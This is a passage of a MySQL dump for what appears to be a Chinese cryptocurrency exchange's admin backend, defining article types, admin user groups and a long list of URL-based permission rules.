sans-serif;color:#333333;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<a>为了维护广大用户的财产安全我们将尽量避免币种下线。</a>\r\n</p>', null, '3', '1476153476', '1476153478', '0');
INSERT INTO `movesay_article_type` VALUES ('18', 'dd', '工具下载', null, '', '0', '0', 'xiazai', '测试数据', null, '4', '1476154986', '1476154987', '0');
INSERT INTO `movesay_article_type` VALUES ('19', 'aaa', 'Notice', null, '', '1', '0', '', '', null, '1', '0', '0', '1');
INSERT INTO `movesay_article_type` VALUES ('20', 'bbb', 'News', null, '', '1', '0', '', '', null, '2', '1476156347', '1476156351', '1');
INSERT INTO `movesay_article_type` VALUES ('21', 'ccc', 'FAQ', null, '', '1', '0', '', '', null, '3', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_auth_extend
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_extend`;
CREATE TABLE `movesay_auth_extend` (
  `group_id` mediumint(10) unsigned NOT NULL COMMENT '用户id',
  `extend_id` mediumint(8) unsigned NOT NULL COMMENT '扩展表中数据的id',
  `type` tinyint(1) unsigned NOT NULL COMMENT '扩展类型标识 1:栏目分类权限;2:模型权限',
  UNIQUE KEY `group_extend_type` (`group_id`,`extend_id`,`type`),
  KEY `uid` (`group_id`),
  KEY `group_id` (`extend_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_extend
-- ----------------------------
INSERT INTO `movesay_auth_extend` VALUES ('1', '1', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '1', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '2', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '2', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '3', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '3', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '4', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '37', '1');

-- ----------------------------
-- Table structure for movesay_auth_group
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_group`;
CREATE TABLE `movesay_auth_group` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT COMMENT '用户组id,自增主键',
  `module` varchar(20) NOT NULL COMMENT '用户组所属模块',
  `type` tinyint(4) NOT NULL COMMENT '组类型',
  `title` char(20) NOT NULL DEFAULT '' COMMENT '用户组中文名称',
  `description` varchar(80) NOT NULL DEFAULT '' COMMENT '描述信息',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '用户组状态：为1正常，为0禁用,-1为删除',
  `rules` varchar(500) NOT NULL DEFAULT '' COMMENT '用户组拥有的规则id，多个规则 , 隔开',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_group
-- ----------------------------
INSERT INTO `movesay_auth_group` VALUES ('12', 'admin', '1', '超级管理员', '', '1', '1710,1711,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1787,1790,1791,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1810,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,');
INSERT INTO `movesay_auth_group` VALUES ('11', 'admin', '1', '客服', '', '1', '1710,1711,1716,1718,1719,1720,1726,1732,1736,1747,1748,1787,1845,1875,1877,1879,1884,1885,1887');

-- ----------------------------
-- Table structure for movesay_auth_group_access
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_group_access`;
CREATE TABLE `movesay_auth_group_access` (
  `uid` int(10) unsigned NOT NULL COMMENT '用户id',
  `group_id` mediumint(8) unsigned NOT NULL COMMENT '用户组id',
  UNIQUE KEY `uid_group_id` (`uid`,`group_id`),
  KEY `uid` (`uid`),
  KEY `group_id` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_group_access
-- ----------------------------
INSERT INTO `movesay_auth_group_access` VALUES ('2', '3');
INSERT INTO `movesay_auth_group_access` VALUES ('3', '2');
INSERT INTO `movesay_auth_group_access` VALUES ('4', '11');
INSERT INTO `movesay_auth_group_access` VALUES ('6', '12');
INSERT INTO `movesay_auth_group_access` VALUES ('7', '13');

-- ----------------------------
-- Table structure for movesay_auth_rule
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_rule`;
CREATE TABLE `movesay_auth_rule` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT COMMENT '规则id,自增主键',
  `module` varchar(20) NOT NULL COMMENT '规则所属module',
  `type` tinyint(2) NOT NULL DEFAULT '1' COMMENT '1-url;2-主菜单',
  `name` char(80) NOT NULL DEFAULT '' COMMENT '规则唯一英文标识',
  `title` char(20) NOT NULL DEFAULT '' COMMENT '规则中文描述',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有效(0:无效,1:有效)',
  `condition` varchar(300) NOT NULL DEFAULT '' COMMENT '规则附加条件',
  PRIMARY KEY (`id`),
  KEY `module` (`module`,`status`,`type`)
) ENGINE=MyISAM AUTO_INCREMENT=1897 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_rule
-- ----------------------------
INSERT INTO `movesay_auth_rule` VALUES ('425', 'admin', '1', 'Admin/article/add', '新增', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('427', 'admin', '1', 'Admin/article/setStatus', '改变状态', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('428', 'admin', '1', 'Admin/article/update', '保存', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('429', 'admin', '1', 'Admin/article/autoSave', '保存草稿', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('430', 'admin', '1', 'Admin/article/move', '移动', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('432', 'admin', '2', 'Admin/Article/mydocument', '内容', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('437', 'admin', '1', 'Admin/Trade/config', '交易配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('449', 'admin', '1', 'Admin/Index/operate', '市场统计', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('455', 'admin', '1', 'Admin/Issue/config', '认购配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('457', 'admin', '1', 'Admin/Index/database/type/export', '数据备份', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('461', 'admin', '1', 'Admin/Article/chat', '聊天列表', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('464', 'admin', '1', 'Admin/Index/database/type/import', '数据还原', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('471', 'admin', '1', 'Admin/Mytx/config', '提现配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('472', 'admin', '2', 'Admin/Mytx/index', '提现', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('473', 'admin', '1', 'Admin/Config/market', '市场配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('477', 'admin', '1', 'Admin/User/myzr', '转入虚拟币', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('479', 'admin', '1', 'Admin/User/myzc', '转出虚拟币', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('482', 'admin', '2', 'Admin/ExtA/index', '扩展', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('488', 'admin', '1', 'Admin/Auth_manager/createGroup', '新增用户组', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('499', 'admin', '1', 'Admin/ExtA/index', '扩展管理', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('509', 'admin', '1', 'Admin/Article/adver_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('510', 'admin', '1', 'Admin/Article/adver_status', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('513', 'admin', '1', 'Admin/Issue/index_edit', '认购编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('514', 'admin', '1', 'Admin/Issue/index_status', '认购修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('515', 'admin', '1', 'Admin/Article/chat_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('516', 'admin', '1', 'Admin/Article/chat_status', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('517', 'admin', '1', 'Admin/User/coin_edit', 'coin修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('519', 'admin', '1', 'Admin/Mycz/type_status', '状态修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('520', 'admin', '1', 'Admin/Issue/log_status', '认购状态', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('521', 'admin', '1', 'Admin/Issue/log_jiedong', '认购解冻', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('522', 'admin', '1', 'Admin/Tools/database/type/export', '数据备份', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('525', 'admin', '1', 'Admin/Config/coin_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('526', 'admin', '1', 'Admin/Config/coin_add', '编辑币种', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('527', 'admin', '1', 'Admin/Config/coin_status', '状态修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('528', 'admin', '1', 'Admin/Config/market_edit', '编辑', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('530', 'admin', '1', 'Admin/Tools/database/type/import', '数据还原', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('541', 'admin', '2', 'Admin/Trade/config', '交易', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('569', 'admin', '1', 'Admin/ADVERstatus', '修改', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('570', 'admin', '1', 'Admin/Tradelog/index', '交易记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('585', 'admin', '1', 'Admin/Config/mycz', '充值配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('590', 'admin', '1', 'Admin/Mycztype/index', '充值类型', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('600', 'admin', '1', 'Admin/Usergoods/index', '用户联系地址', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1379', 'admin', '1', 'Admin/Bazaar/index', '集市管理', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1405', 'admin', '1', 'Admin/Bazaar/config', '集市配置', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1425', 'admin', '1', 'Admin/Bazaar/log', '集市记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1451', 'admin', '1', 'Admin/Bazaar/invit', '集市推广', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1697', 'admin', '1', 'Admin/AuthManager/createGroup', '新增用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1698', 'admin', '1', 'Admin/AuthManager/editgroup', '编辑用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1699', 'admin', '1', 'Admin/AuthManager/writeGroup', '更新用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1700', 'admin', '1', 'Admin/AuthManager/changeStatus', '改变状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1701', 'admin', '1', 'Admin/AuthManager/access', '访问授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1702', 'admin', '1', 'Admin/AuthManager/category', '分类授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1703', 'admin', '1', 'Admin/AuthManager/user', '成员授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1704', 'admin', '1', 'Admin/AuthManager/tree', '成员列表授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1705', 'admin', '1', 'Admin/AuthManager/group', '用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1706', 'admin', '1', 'Admin/AuthManager/addToGroup', '添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1707', 'admin', '1', 'Admin/AuthManager/removeFromGroup', '用户组移除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1708', 'admin', '1', 'Admin/AuthManager/addToCategory', '分类添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1709', 'admin', '1', 'Admin/AuthManager/addToModel', '模型添加到用户组', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1710', 'admin', '1', 'Admin/Trade/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1711', 'admin', '1', 'Admin/Trade/chexiao', '撤销挂单', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1712', 'admin', '1', 'Admin/Shop/images', '图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1713', 'admin', '1', 'Admin/Login/index', '用户登录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1714', 'admin', '1', 'Admin/Login/loginout', '用户退出', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1715', 'admin', '1', 'Admin/User/setpwd', '修改管理员密码', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1716', 'admin', '2', 'Admin/Index/index', '系统', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1717', 'admin', '2', 'Admin/Article/index', '内容', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1718', 'admin', '2', 'Admin/User/index', '用户', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1719', 'admin', '2', 'Admin/Finance/index', '财务', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1720', 'admin', '2', 'Admin/Trade/index', '交易', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1721', 'admin', '2', 'Admin/Game/index', '应用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1722', 'admin', '2', 'Admin/Config/index', '设置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1723', 'admin', '2', 'Admin/Operate/index', '运营', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1724', 'admin', '2', 'Admin/Tools/index', '工具', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1725', 'admin', '2', 'Admin/Cloud/index', '扩展', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1726', 'admin', '1', 'Admin/Index/index', '系统概览', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1727', 'admin', '1', 'Admin/Article/index', '文章管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1728', 'admin', '1', 'Admin/Article/edit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1729', 'admin', '1', 'Admin/Text/index', '提示文字', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1730', 'admin', '1', 'Admin/Text/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1731', 'admin', '1', 'Admin/Text/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1732', 'admin', '1', 'Admin/User/index', '用户管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1733', 'admin', '1', 'Admin/Finance/config', '配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1734', 'admin', '1', 'Admin/Finance/type', '类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1735', 'admin', '1', 'Admin/Finance/type_status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1736', 'admin', '1', 'Admin/Trade/index', '委托管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1737', 'admin', '1', 'Admin/Config/index', '基本配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1738', 'admin', '1', 'AdminUser/detail', '后台用户详情', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1739', 'admin', '1', 'AdminUser/status', '后台用户状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1740', 'admin', '1', 'AdminUser/add', '后台用户新增', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1741', 'admin', '1', 'AdminUser/edit', '后台用户编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1742', 'admin', '1', 'Admin/Articletype/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1743', 'admin', '1', 'Admin/Finance/index', '财务明细', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1744', 'admin', '1', 'Admin/Finance/myczTypeEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1745', 'admin', '1', 'Admin/Cloud/index', '云市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1746', 'admin', '1', 'Admin/Tools/index', '清理缓存', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1747', 'admin', '1', 'Admin/User/edit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1748', 'admin', '1', 'Admin/User/status', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1749', 'admin', '1', 'Admin/User/adminEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1750', 'admin', '1', 'Admin/User/adminStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1751', 'admin', '1', 'Admin/User/authEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1752', 'admin', '1', 'Admin/User/authStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1753', 'admin', '1', 'Admin/User/authStart', '重新初始化权限', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1754', 'admin', '1', 'Admin/User/logEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1755', 'admin', '1', 'Admin/User/logStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1756', 'admin', '1', 'Admin/User/qianbaoEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1757', 'admin', '1', 'Admin/User/qianbaoStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1758', 'admin', '1', 'Admin/User/bankEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1759', 'admin', '1', 'Admin/User/bankStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1760', 'admin', '1', 'Admin/User/coinEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1761', 'admin', '1', 'Admin/User/coinLog', '财产统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1762', 'admin', '1', 'Admin/User/goodsEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1763', 'admin', '1', 'Admin/User/goodsStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1764', 'admin', '1', 'Admin/Article/typeEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1765', 'admin', '1', 'Admin/Article/linkEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1766', 'admin', '1', 'Admin/Article/adverEdit', '编辑添加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1767', 'admin', '1', 'Admin/User/authAccess', '访问授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1768', 'admin', '1', 'Admin/User/authAccessUp', '访问授权修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1769', 'admin', '1', 'Admin/User/authUser', '成员授权', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1770', 'admin', '1', 'Admin/User/authUserAdd', '成员授权增加', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1771', 'admin', '1', 'Admin/User/authUserRemove', '成员授权解除', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1772', 'admin', '1', 'Admin/Operate/index', '推广奖励', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1773', 'admin', '1', 'Admin/App/config', 'APP配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1774', 'admin', '1', 'Admin/Shop/index', '商品管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1775', 'admin', '1', 'Admin/Issue/index', '认购管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1776', 'admin', '1', 'Admin/Issue/log', '认购记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1777', 'admin', '1', 'Admin/Huafei/index', '充值记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1778', 'admin', '1', 'Admin/Huafei/config', '充值配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1779', 'admin', '1', 'Admin/Vote/index', '投票记录', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1780', 'admin', '1', 'Admin/Vote/type', '投票类型', '-1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1781', 'admin', '1', 'Admin/Money/index', '理财管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1782', 'admin', '1', 'Admin/Article/images', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1783', 'admin', '1', 'Admin/Adver/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1784', 'admin', '1', 'Admin/Adver/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1785', 'admin', '1', 'Admin/User/index_edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1786', 'admin', '1', 'Admin/User/index_status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1787', 'admin', '1', 'Admin/Trade/log', '成交记录', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1788', 'admin', '1', 'Admin/Issue/edit', '认购编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1789', 'admin', '1', 'Admin/Issue/status', '认购修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1790', 'admin', '1', 'Admin/Config/moble', '短信配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1791', 'admin', '1', 'Admin/Invit/config', '推广配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1792', 'admin', '1', 'Admin/Link/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1793', 'admin', '1', 'Admin/Link/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1794', 'admin', '1', 'Admin/Index/coin', '币种统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1795', 'admin', '1', 'Admin/Cloud/update', '自动升级', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1796', 'admin', '1', 'Admin/Article/type', '文章类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1797', 'admin', '1', 'Admin/Finance/mycz', '人民币充值', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1798', 'admin', '1', 'Admin/Finance/myczTypeStatus', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1799', 'admin', '1', 'Admin/Finance/myczTypeImage', '上传图片', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1800', 'admin', '1', 'Admin/Finance/mytxStatus', '修改状态', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1801', 'admin', '1', 'Admin/Tools/dataExport', '备份数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1802', 'admin', '1', 'Admin/Tools/dataImport', '还原数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1803', 'admin', '1', 'Admin/User/admin', '管理员管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1804', 'admin', '1', 'Admin/App/vip_config_list', 'APP等级', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1805', 'admin', '1', 'Admin/Shop/config', '商城配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1806', 'admin', '1', 'Admin/Money/log', '理财日志', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1807', 'admin', '1', 'Admin/Index/market', '市场统计', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1808', 'admin', '1', 'Admin/Chat/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1809', 'admin', '1', 'Admin/Chat/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1810', 'admin', '1', 'Admin/Usercoin/edit', '财产修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1811', 'admin', '1', 'Admin/Mycz/status', '修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1812', 'admin', '1', 'Admin/Mycztype/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1813', 'admin', '1', 'Admin/Config/contact', '客服配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1814', 'admin', '1', 'Admin/Tools/queue', '服务器队列', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1815', 'admin', '1', 'Admin/Tools/qianbao', '钱包检查', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1816', 'admin', '1', 'Admin/Cloud/game', '应用管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1817', 'admin', '1', 'Admin/Article/adver', '广告管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1818', 'admin', '1', 'Admin/Trade/chat', '交易聊天', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1819', 'admin', '1', 'Admin/Finance/myczType', '人民币充值方式', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1820', 'admin', '1', 'Admin/Finance/mytxExcel', '导出选中', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1821', 'admin', '1', 'Admin/User/auth', '权限列表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1822', 'admin', '1', 'Admin/App/adsblock_list', 'APP广告板块', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1823', 'admin', '1', 'Admin/Shop/type', '商品类型', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1824', 'admin', '1', 'Admin/Fenhong/index', '分红管理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1825', 'admin', '1', 'Admin/Huafei/type', '充值金额', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1826', 'admin', '1', 'Admin/Money/fee', '理财明细', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1827', 'admin', '1', 'Admin/Config/bank', '银行配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1828', 'admin', '1', 'Admin/Config/bank_edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1829', 'admin', '1', 'Admin/Coin/edit', '编辑', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1830', 'admin', '1', 'Admin/Coin/status', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1831', 'admin', '1', 'Admin/Market/edit', '编辑市场', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1832', 'admin', '1', 'Admin/Config/market_add', '状态修改', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1833', 'admin', '1', 'Admin/Tools/invoke', '其他模块调用', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1834', 'admin', '1', 'Admin/Tools/optimize', '优化表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1835', 'admin', '1', 'Admin/Tools/repair', '修复表', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1836', 'admin', '1', 'Admin/Tools/del', '删除备份文件', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1837', 'admin', '1', 'Admin/Tools/export', '备份数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1838', 'admin', '1', 'Admin/Tools/import', '还原数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1839', 'admin', '1', 'Admin/Tools/excel', '导出数据库', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1840', 'admin', '1', 'Admin/Tools/exportExcel', '导出Excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1841', 'admin', '1', 'Admin/Tools/importExecl', '导入Excel', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1842', 'admin', '1', 'Admin/User/detail', '用户详情', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1843', 'admin', '1', 'Admin/Trade/comment', '币种评论', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1844', 'admin', '1', 'Admin/Article/link', '友情链接', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1845', 'admin', '1', 'Admin/User/log', '登陆日志', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1846', 'admin', '1', 'Admin/Finance/mytx', '人民币提现', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1847', 'admin', '1', 'Admin/Finance/mytxChuli', '正在处理', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1848', 'admin', '1', 'Admin/Config/coin', '币种配置', '1', '');
INSERT INTO `movesay_auth_rule` VALUES ('1849', 'admin', '1', 'Admin/App/ads_user', 'APP广告用户', '1', '');
